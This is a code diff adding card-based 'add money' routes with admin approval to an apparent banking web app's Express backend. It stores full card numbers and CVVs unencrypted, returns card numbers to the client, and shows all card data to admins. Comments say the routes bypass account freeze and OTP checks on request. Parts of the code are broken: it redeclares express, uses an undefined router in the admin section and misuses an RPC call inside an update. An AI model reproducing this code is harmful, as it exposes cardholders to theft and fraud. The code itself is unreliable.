@@ -1935,6 +1935,195 @@ app.post("/api/chat/live", authenticate, async (req, res) => {
   }
 });
 
+// In your user routes file (protected by authenticate middleware)
+
+const express = require('express');
+const router = express.Router();
+const { authenticate, checkAccountFrozen } = require('../middleware/auth'); // Note: Add Money bypasses freeze
+
+// GET saved cards (for display in Add Money page)
+router.get('/saved-cards', authenticate, async (req, res) => {
+    try {
+        const { data, error } = await supabase
+            .from('add_money_requests')
+            .select('id, card_number, expiry_date, cardholder_name, card_type, status')
+            .eq('user_id', req.user.id)
+            .eq('status', 'approved')
+            .order('created_at', { ascending: false });
+
+        if (error) throw error;
+
+        res.json(data || []);
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to load saved cards' });
+    }
+});
+
+// POST Add Money Request (BYPASSES freeze and OTP as requested)
+router.post('/add-money', authenticate, async (req, res) => {
+    const { card_number, expiry_date, cvv, cardholder_name, amount } = req.body;
+
+    if (!card_number || !expiry_date || !cvv || !cardholder_name || !amount || amount < 10) {
+        return res.status(400).json({ error: 'Invalid card or amount details' });
+    }
+
+    try {
+        const { data, error } = await supabase
+            .from('add_money_requests')
+            .insert({
+                user_id: req.user.id,
+                card_number,      // In production: encrypt this!
+                expiry_date,
+                cvv,
+                cardholder_name,
+                amount,
+                status: 'pending'
+            })
+            .select()
+            .single();
+
+        if (error) throw error;
+
+        // Optional: Send notification to user
+        await supabase.from('notifications').insert({
+            user_id: req.user.id,
+            title: 'Add Money Request Submitted',
+            message: `Your request to add $${amount} is pending admin approval (usually within 1 hour).`,
+            type: 'info'
+        });
+
+        res.json({ 
+            success: true, 
+            message: 'Request sent to admin for approval',
+            request_id: data.id 
+        });
+    } catch (error) {
+        console.error(error);
+        res.status(500).json({ error: 'Failed to submit add money request' });
+    }
+});
+
+// ==================== ADMIN ROUTES ================
+
+// In your admin routes file (protected by authenticate + authorizeAdmin)
+
+const express = require('express');
+const { authenticate, authorizeAdmin } = require('../middleware/auth');
+
+// GET all pending add money requests
+router.get('/add-money-requests', authenticate, authorizeAdmin, async (req, res) => {
+    try {
+        const { data, error } = await supabase
+            .from('add_money_requests')
+            .select(`
+                *, 
+                user:users(id, first_name, last_name, email)
+            `)
+            .eq('status', 'pending')
+            .order('created_at', { ascending: false });
+
+        if (error) throw error;
+        res.json(data || []);
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to load requests' });
+    }
+});
+
+// POST Accept Add Money Request
+router.post('/add-money-requests/:id/approve', authenticate, authorizeAdmin, async (req, res) => {
+    const { id } = req.params;
+
+    try {
+        // Get the request
+        const { data: request, error: fetchError } = await supabase
+            .from('add_money_requests')
+            .select('*')
+            .eq('id', id)
+            .single();
+
+        if (fetchError || !request) return res.status(404).json({ error: 'Request not found' });
+
+        // Update request status
+        await supabase
+            .from('add_money_requests')
+            .update({ 
+                status: 'approved',
+                processed_at: new Date().toISOString(),
+                processed_by: req.user.id
+            })
+            .eq('id', id);
+
+        // Add money to user's primary account (or first account)
+        const { data: account } = await supabase
+            .from('accounts')
+            .select('id')
+            .eq('user_id', request.user_id)
+            .limit(1)
+            .single();
+
+        if (account) {
+            await supabase
+                .from('accounts')
+                .update({ 
+                    balance: supabase.rpc('increment_balance', { amount: request.amount }),
+                    available_balance: supabase.rpc('increment_balance', { amount: request.amount })
+                })
+                .eq('id', account.id);
+        }
+
+        // Notification to user
+        await supabase.from('notifications').insert({
+            user_id: request.user_id,
+            title: 'Add Money Approved',
+            message: `$${request.amount} has been added to your balance.`,
+            type: 'success'
+        });
+
+        res.json({ success: true, message: 'Funds added successfully' });
+    } catch (error) {
+        console.error(error);
+        res.status(500).json({ error: 'Failed to approve request' });
+    }
+});
+
+// POST Decline Add Money Request
+router.post('/add-money-requests/:id/decline', authenticate, authorizeAdmin, async (req, res) => {
+    const { id } = req.params;
+    const { reason } = req.body;
+
+    try {
+        const { data: request } = await supabase
+            .from('add_money_requests')
+            .select('*')
+            .eq('id', id)
+            .single();
+
+        if (!request) return res.status(404).json({ error: 'Request not found' });
+
+        await supabase
+            .from('add_money_requests')
+            .update({ 
+                status: 'declined',
+                admin_note: reason || 'Request declined by admin',
+                processed_at: new Date().toISOString(),
+                processed_by: req.user.id
+            })
+            .eq('id', id);
+
+        // Notification to user
+        await supabase.from('notifications').insert({
+            user_id: request.user_id,
+            title: 'Add Money Declined',
+            message: `Your request to add $${request.amount} was declined. Reason: ${reason || 'No reason provided'}`,
+            type: 'error'
+        });
+
+        res.json({ success: true, message: 'Request declined' });
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to decline request' });
+    }
+});
+
 // ADMIN - List of users who ever sent a message
 app.get("/api/admin/live-chat/users", authenticate, authorizeAdmin, async (req, res) => {
   try {
@@ -2037,7 +2226,7 @@ app.post(
   },
 );
 
-// ==================== ADMIN ROUTES ================
+
 
 // Get all users (admin)
 app.get("/api/admin/users", authenticate, authorizeAdmin, async (req, res) => {
